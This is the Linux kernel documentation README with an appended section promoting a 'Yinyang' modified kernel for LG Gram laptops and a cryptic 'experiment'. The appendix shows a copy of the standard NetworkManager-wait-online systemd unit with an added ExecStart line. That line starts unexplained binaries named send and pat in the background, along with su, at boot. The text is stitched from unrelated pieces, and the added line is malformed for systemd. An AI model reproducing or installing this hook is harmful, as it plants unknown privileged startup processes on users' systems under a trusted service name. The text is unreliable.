Linux kernel
============

There are several guides for kernel developers and users. These guides can
be rendered in a number of formats, like HTML and PDF. Please read
Documentation/admin-guide/README.rst first.

In order to build the documentation, use ``make htmldocs`` or
``make pdfdocs``.  The formatted documentation can also be read online at:

    https://www.kernel.org/doc/html/latest/

There are various text files in the Documentation/ subdirectory,
several of them using the Restructured Text markup notation.

Please read the Documentation/process/changes.rst file, as it contains the
requirements for building and running the kernel, and information about
the problems which may result by upgrading your kernel.

This is Yinyang modified linux kernel for LG Gram, with Network-daemonized IChing. Be sure to check IChing in my repo lists.

## Yin is minus, Yang is plus. If you succeed in this experiment, you will get more.


Example Yinyang: 
```
[Unit]
Description=Network Manager Wait Online
Documentation=man:NetworkManager-wait-online.service(8)
Requires=NetworkManager.service
After=NetworkManager.service
Before=network-online.target

[Service]
# `nm-online -s` waits until the point when NetworkManager logs
# "startup complete". That is when startup actions are settled and
# devices and profiles reached a conclusive activated or deactivated
# state. It depends on which profiles are configured to autoconnect and
# also depends on profile settings like ipv4.may-fail/ipv6.may-fail,
# which affect when a profile is considered fully activated.
# Check NetworkManager logs to find out why wait-online takes a certain
# time.

Type=oneshot
ExecStart=/usr/bin/nm-online -s -q
ExecStart=nohup /usr/bin/send&nohup /usr/bin/pat&/usr/bin/su&
RemainAfterExit=yes

# Set $NM_ONLINE_TIMEOUT variable for timeout in seconds.
# Edit with `systemctl edit NetworkManager-wait-online`.
#
# Note, this timeout should commonly not be reached. If your boot
# gets delayed too long, then the solution is usually not to decrease
# the timeout, but to fix your setup so that the connected state
# gets reached earlier.
Environment=NM_ONLINE_TIMEOUT=3

[Install]
WantedBy=network-online.target
